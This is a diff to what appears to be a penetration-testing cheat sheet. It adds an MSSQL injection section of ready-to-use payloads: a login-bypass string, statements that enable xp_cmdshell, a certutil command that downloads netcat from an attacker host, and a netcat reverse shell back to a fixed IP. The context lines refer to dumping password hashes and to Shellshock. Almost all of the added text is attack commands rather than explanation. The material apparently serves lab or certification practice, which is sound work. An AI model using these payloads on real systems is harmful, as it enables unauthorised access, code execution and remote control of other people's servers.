@@ -82,6 +82,18 @@ SQL Injection
 2. Manually test payloads or use Burp Intruder with SQL payloads.
 3. Grab password hashes or perform code exec to obtain reverse shell.
 
+MSSQL Injection
+```
+/login.asp?name=admin'%20or%20'1'%3d'1'--&pass=asdf # bypass login
+
+';EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # enable xp_cmdshell code exec
+';EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;           # enable xp_cmdshell code exec
+';EXEC%20xp_cmdshell%20'ping%20192.168.119.210'--            # test code exec
+
+';EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://[kali]/nc.exe'-- # upload netcat
+';EXEC xp_cmdshell 'nc 192.168.119.210 443 -e cmd.exe'--    # initiate reverse shell connection
+```
+
 Apache Shellchock (/cgi-bin/*.cgi])
 ```
 # Test if vulnerable
